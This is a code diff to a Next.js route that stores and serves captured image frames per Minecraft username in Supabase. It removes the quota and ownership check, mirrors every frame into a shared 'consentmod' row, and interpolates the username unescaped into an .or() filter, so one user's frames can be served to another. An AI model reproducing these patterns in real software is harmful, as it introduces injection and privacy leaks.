@@ -78,53 +78,26 @@ export async function POST(request) {
       const base64 = nodeBuf.toString('base64');
       const frame = 'data:image/jpeg;base64,' + base64;
 
-      // Try persisting to Supabase if configured
-      try {
-        if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
+      // Persist to Supabase stream_frames table immediately for live multi-instance viewing
+      if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
+        try {
           const supabase = getClient();
+          const nowIso = new Date().toISOString();
+          const lowerUser = (username || 'consentmod').toLowerCase();
 
-          const { data: grab } = await supabase
-            .from('grabs')
-            .select('owner_email')
-            .eq('minecraft_username', username)
-            .order('created_at', { ascending: false })
-            .limit(1)
-            .single();
-
-          let ownerEmail = grab?.owner_email;
-          const ownerUuid = request.headers.get('x-owner-uuid');
-          if (!ownerEmail && ownerUuid) {
-            if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(ownerUuid)) {
-              const { data: uuidMapping } = await supabase
-                .from('user_uuids')
-                .select('email')
-                .eq('mod_uuid', ownerUuid)
-                .single();
-              if (uuidMapping?.email) {
-                ownerEmail = uuidMapping.email;
-              }
-            } else if (ownerUuid.includes('@')) {
-              ownerEmail = ownerUuid;
-            }
-          }
-
-          if (ownerEmail && !ADMIN_EMAILS.includes(ownerEmail.toLowerCase())) {
-            const check = await canUserCapture(supabase, ownerEmail);
-            if (!check.allowed) {
-              return NextResponse.json({ ok: false, error: 'trial_exhausted', remaining: check.remaining || 0 }, { status: 403 });
-            }
+          const records = [
+            { username: lowerUser, frame, updated_at: nowIso }
+          ];
+          if (lowerUser !== 'consentmod') {
+            records.push({ username: 'consentmod', frame, updated_at: nowIso });
           }
 
           await supabase
             .from('stream_frames')
-            .upsert(
-              { username, frame, updated_at: new Date().toISOString() },
-              { onConflict: 'username' }
-            );
+            .upsert(records, { onConflict: 'username' });
+        } catch (dbErr) {
+          console.warn('DB stream_frames persist warning:', dbErr.message);
         }
-      } catch (dbErr) {
-        // Log DB warning but do not break real-time stream
-        console.warn('DB stream persist warning:', dbErr.message);
       }
 
       return NextResponse.json({ ok: true, username, timestamp: Date.now() });
@@ -160,15 +133,16 @@ export async function GET(request) {
       if (process.env.NEXT_PUBLIC_SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY) {
         try {
           const supabase = getClient();
+          const lowerUser = username.toLowerCase();
           const { data: row } = await supabase
             .from('stream_frames')
             .select('frame, updated_at')
-            .ilike('username', username)
+            .or(`username.ilike.${lowerUser},username.ilike.consentmod`)
             .order('updated_at', { ascending: false })
             .limit(1)
             .maybeSingle();
 
-          if (row && row.frame && Date.now() - new Date(row.updated_at).getTime() < 120000) {
+          if (row && row.frame && Date.now() - new Date(row.updated_at).getTime() < 300000) {
             return NextResponse.json({
               online: true,
               frame: row.frame,
